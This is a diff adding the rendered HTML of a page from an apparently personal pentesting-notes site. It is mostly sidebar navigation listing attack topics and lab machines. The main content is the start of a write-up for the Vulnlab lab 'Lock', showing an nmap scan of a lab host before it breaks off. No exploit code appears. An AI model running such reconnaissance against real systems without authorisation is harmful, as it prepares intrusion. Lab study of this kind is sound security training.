+      <a href="/notes/6-lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open open>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/6-lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details open>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/4-services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+          </nav>
+        </aside>
+      </div>
+    </div>
+    
+    <button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavMain" aria-controls="offcanvasNavMain" aria-label="Open main navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <line x1="4" y1="8" x2="20" y2="8"></line>
+        <line x1="4" y1="16" x2="20" y2="16"></line>
+      </svg>
+    </button>
+
+    
+    <div class="offcanvas offcanvas-end h-auto" tabindex="-1" id="offcanvasNavMain" aria-labelledby="offcanvasNavMainLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavMainLabel">P4V1C</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+         </svg>
+        </button>
+      </div>
+      
+      <div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between">
+        <ul class="navbar-nav flex-grow-1"><li class="nav-item">
+                <a class="nav-link active" href="http://localhost:1313/notes/ad/ad-cs" aria-current="true">Notes</a>
+              </li>
+            <li class="nav-item">
+                <a class="nav-link" href="http://localhost:1313/blog/">Blog</a>
+              </li>
+            </ul>
+
+        
+        
+        <button type="button" id="searchToggleDesktop" class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <circle cx="10" cy="10" r="7"></circle>
+            <line x1="21" y1="21" x2="15" y2="15"></line>
+          </svg>
+        </button>
+        
+        
+        
+        <button id="buttonColorMode" class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type="button" aria-label="Toggle theme">
+          <svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+          </svg>
+          <svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0m-5 0h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path>
+          </svg>
+        </button>
+        
+        <ul id="socialMenu" class="nav mx-auto flex-row order-lg-4">
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://github.com/thuliteio/doks"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a>
+            </li>
+          </ul>
+        
+        </div>
+    </div>
+
+    
+    </div>
+</header>
+</div>
+
+<div class="modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1>
+        <button type="button" class="btn-close visually-hidden" data-bs-dismiss="modal" aria-label="Close"></button>
+        <div class="search-input flex-grow-1 d-none">
+          <form id="search-form" class="search-form" action="#" method="post" accept-charset="UTF-8" role="search">
+            <label for="query" class="visually-hidden">Search</label>
+            <div class="d-flex">
+              <input type="search" id="query" name="query" class="search-text form-control form-control-lg" placeholder="Search" aria-label="Search" maxlength="128" autocomplete="off">
+              <button type="button" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
+            </div>
+          </form>
+        </div>
+      </div>
+      <div class="modal-body">
+        <p class="search-loading status message d-none mt-3 text-center">Loading search index…</p>
+        <p class="search-no-recent message d-none mt-3 text-center">No recent searches</p>
+        <p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p>
+        <div id="searchResults" class="search-results"></div>
+        <template>
+          <article class="search-result list-view">
+            <div class="card my-3">
+              <div class="card-body">
+                <header>
+                  <h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2>
+                  <div class="submitted d-none"><time class="created-date">Date here</time></div>
+                </header>
+                <div class="content">Summary here</div>
+              </div>
+            </div>
+          </article>
+        </template>
+      </div>
+      <div class="modal-footer">
+        <ul class="list-inline me-auto d-none d-md-block">
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li>
+        </ul>
+        <p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+    <div class="wrap container-lg" role="document">
+      <div class="content">
+      
+        
+	<div class="row flex-xl-nowrap">
+		<div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block">
+			
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/5-crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/5-crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open open>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details open>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/6-lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open open>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/6-lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details open>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/4-services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/4-services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+		</div>
+		
+		<nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
+			<div class="page-links">
+  
+</div>
+
+		</nav>
+		<main class="docs-content col-lg-11 col-xl-9">
+		
+			<h1>Lock</h1>
+			
+			<nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation">
+				
+			</nav>
+			<p>Scan:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.91.85
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.019s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">995</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Lock - Index
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">3000/tcp open  ppp?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines, Help, RTSPRequest:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Cache-Control: max-age<span class="o">=</span>0, private, must-revalidate, no-transform
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">i_like_gitea</span><span class="o">=</span>000de57810f83b07<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">_csrf</span><span class="o">=</span>m9-ZDGG7FEDFvFsXs0KGSsjcYNk6MTcyMTgyNjA1ODkxNzQ3MjEwMA<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> Max-Age<span class="o">=</span>86400<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Frame-Options: SAMEORIGIN
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Wed, <span class="m">24</span> Jul <span class="m">2024</span> 13:00:59 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html&gt;
